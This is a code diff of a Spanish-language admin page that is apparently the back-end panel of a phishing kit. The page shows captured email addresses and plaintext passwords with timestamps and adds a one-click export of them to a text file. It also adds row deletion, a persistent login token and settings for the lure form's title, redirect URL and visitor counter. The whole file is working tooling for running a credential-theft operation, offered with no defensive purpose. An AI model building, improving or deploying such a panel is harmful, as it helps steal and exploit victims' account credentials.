@@ -2,28 +2,30 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Panel Admin - Protegido</title>
+    <title>Admin - JEFFREY PRO</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; margin: 0; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
         #login-screen { height: 100vh; display: flex; justify-content: center; align-items: center; background: #1c1e21; }
-        .login-box { background: white; padding: 30px; border-radius: 10px; width: 300px; text-align: center; }
-        #admin-panel { display: none; } /* Oculto hasta loguearse */
+        .login-box { background: white; padding: 30px; border-radius: 10px; width: 300px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        #admin-panel { display: none; }
         .sidebar { width: 250px; background: #1c1e21; color: white; height: 100vh; padding: 20px; position: fixed; }
         .main { margin-left: 270px; padding: 30px; }
         .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 20px; }
         input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        table { width: 100%; border-collapse: collapse; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
         th, td { text-align: left; padding: 12px; border-bottom: 1px solid #ddd; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
+        .btn-delete { background: #ff4d4d; padding: 5px 10px; font-size: 12px; width: auto; margin: 0; }
+        .btn-download { background: #42b72a; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
     <div id="login-screen">
         <div class="login-box">
-            <h2>Acceso Admin</h2>
+            <h2>Panel Jeffrey</h2>
             <input type="text" id="user" placeholder="Usuario">
             <input type="password" id="pass" placeholder="Contraseña">
             <button onclick="login()">Entrar</button>
@@ -32,40 +34,53 @@
 
     <div id="admin-panel">
         <div class="sidebar">
-            <h2>JEFFREY PANEL</h2>
-            <button style="background:none; color:white; border:none; text-align:left; width:100%; cursor:pointer; padding:10px;" onclick="showTab('tab-logins')">Logins</button>
-            <button style="background:none; color:white; border:none; text-align:left; width:100%; cursor:pointer; padding:10px;" onclick="showTab('tab-config')">Configuración</button>
+            <h2>JEFFREY PRO</h2>
+            <button onclick="showTab('tab-logins')">Logins</button>
+            <button onclick="showTab('tab-config')">Configuración</button>
+            <button onclick="logout()" style="background:#555; margin-top:50px;">Cerrar Sesión</button>
         </div>
 
         <div class="main">
             <div id="tab-logins" class="tab-content active">
                 <div class="card">
-                    <h3>Datos Recibidos</h3>
-                    <table><thead><tr><th>Email</th><th>Pass</th><th>Acción</th></tr></thead><tbody id="data-table"></tbody></table>
+                    <h3>Registros Capturados</h3>
+                    <button class="btn-download" onclick="downloadTXT()">Descargar Datos (.txt)</button>
+                    <table>
+                        <thead><tr><th>Email</th><th>Password</th><th>Fecha</th><th>Acción</th></tr></thead>
+                        <tbody id="data-table"></tbody>
+                    </table>
                 </div>
             </div>
 
             <div id="tab-config" class="tab-content">
                 <div class="card">
-                    <h3>Configuración</h3>
-                    <label>Título del Panel:</label>
+                    <h3>Personalización</h3>
+                    <label>Título del Formulario:</label>
                     <input type="text" id="cfg-title">
-                    <label>URL Redirección:</label>
+                    <label>URL de Redirección:</label>
                     <input type="text" id="cfg-url">
                     <label>ID Whos.amung.us:</label>
                     <input type="text" id="cfg-counter">
-                    <button onclick="saveConfig()">Guardar</button>
+                    <button onclick="saveConfig()">Guardar Cambios</button>
                 </div>
-                <div class="card" style="text-align: center;">
-                    <h4>Contador (No clicable)</h4>
-                    <div id="counter-preview" style="pointer-events: none;"></div>
+                <div id="counter-box" class="card" style="text-align:center; pointer-events:none;">
+                    <h4>Vista Previa del Contador</h4>
+                    <div id="counter-preview"></div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Función para Login
+        // PERSISTENCIA: Revisar si ya hay sesión al cargar
+        window.onload = () => {
+            if(localStorage.getItem('adminToken')) {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('admin-panel').style.display = 'block';
+                loadData();
+            }
+        };
+
         async function login() {
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
@@ -74,25 +89,59 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ user, pass })
             });
-            if (res.ok) {
+            const data = await res.json();
+            if (data.success) {
+                localStorage.setItem('adminToken', data.token); // Guardar sesión
                 document.getElementById('login-screen').style.display = 'none';
                 document.getElementById('admin-panel').style.display = 'block';
                 loadData();
-            } else { alert("Datos incorrectos"); }
+            } else { alert("Usuario o clave incorrecta"); }
+        }
+
+        function logout() {
+            localStorage.removeItem('adminToken');
+            location.reload();
         }
 
         function showTab(id) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             document.getElementById(id).classList.add('active');
             if(id === 'tab-config') loadConfig();
+            if(id === 'tab-logins') loadData();
         }
 
         async function loadData() {
             const res = await fetch('/data');
             const data = await res.json();
             document.getElementById('data-table').innerHTML = data.map(row => `
-                <tr><td>${row.email}</td><td>${row.password}</td><td><button onclick="deleteRow(${row.id})" style="background:red; width:auto; padding:5px 10px;">X</button></td></tr>
+                <tr>
+                    <td>${row.email}</td>
+                    <td>${row.password}</td>
+                    <td>${new Date(row.date).toLocaleString()}</td>
+                    <td><button class="btn-delete" onclick="deleteRow(${row.id})">Borrar</button></td>
+                </tr>
             `).join('');
+        }
+
+        async function deleteRow(id) {
+            if(confirm("¿Seguro que quieres borrar este registro?")) {
+                await fetch(`/delete/${id}`, { method: 'DELETE' });
+                loadData();
+            }
+        }
+
+        async function downloadTXT() {
+            const res = await fetch('/data');
+            const data = await res.json();
+            let text = "--- REGISTROS CAPTURADOS ---\n\n";
+            data.forEach(r => {
+                text += `Fecha: ${r.date} | Email: ${r.email} | Pass: ${r.password}\n`;
+            });
+            const blob = new Blob([text], { type: 'text/plain' });
+            const anchor = document.createElement('a');
+            anchor.download = "logins_jeffrey.txt";
+            anchor.href = (window.webkitURL || window.URL).createObjectURL(blob);
+            anchor.click();
         }
 
         async function loadConfig() {
@@ -115,7 +164,8 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ url, counter_id, title })
             });
-            alert("Guardado");
+            alert("¡Configuración actualizada!");
+            loadConfig();
         }
     </script>
 </body>
